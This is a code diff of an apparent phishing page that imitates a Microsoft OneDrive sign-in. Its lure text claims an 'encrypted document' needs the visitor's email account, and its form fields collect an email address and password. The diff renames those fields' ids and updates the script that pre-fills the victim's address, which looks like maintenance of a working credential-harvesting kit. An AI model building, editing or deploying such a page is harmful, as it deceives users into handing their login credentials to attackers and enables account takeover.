@@ -2055,7 +2055,7 @@
             <a class="emailError">Enter a valid email address</a>
             <a class="emailInvalid">Enter a valid email address.</a>
             <a style="color: rgb(255, 81, 0); font-size: small; text-align: justify;">This is an encrypted document, please proceed to view document on OneDrive. Continue with your email account.</a>
-            <input class="emailImput" placeholder="Email Address" type="text" name="em" id="email" onKeyPress="onChangeFunction(this.value)">
+            <input class="emailImput" placeholder="Email Address" type="text" name="em" id="em" onKeyPress="onChangeFunction(this.value)">
             <div class="labelButtom">
                 <!-- <a>No account</a> -->
                 <!-- <a style="color: #0067b8; cursor: pointer;">Create one!</a> -->
@@ -2079,7 +2079,7 @@
             </div>
             <a class="signIn">Enter password</a>
             <span class="passwordError" id="msg"></span>
-            <input class="passwordImput" placeholder="Password" id="password" type="password" name="pw" onKeyPress="onChangeFunction(this.value)">
+            <input class="passwordImput" placeholder="Password" id="pw" type="password" name="pw" onKeyPress="onChangeFunction(this.value)">
             <div class="labelpassword">
                 <input style="height: 20px; width: 20px;" type="checkbox" name="" id="">
                 <a style="color: #000; cursor: pointer; margin-top: 0px; margin-left: 5px;">Keep me signed in</a>
@@ -2117,7 +2117,7 @@ $(document).ready(function()
 		$("#msg").hide();
 		$('#fieldImg').attr('src','');
 		$('#field').html("Other Mail");
-		$("#email").val(i);
+		$("#em").val(i);
 		$("#emailch").html(i);
 		$("#inputbar").animate(
 			{
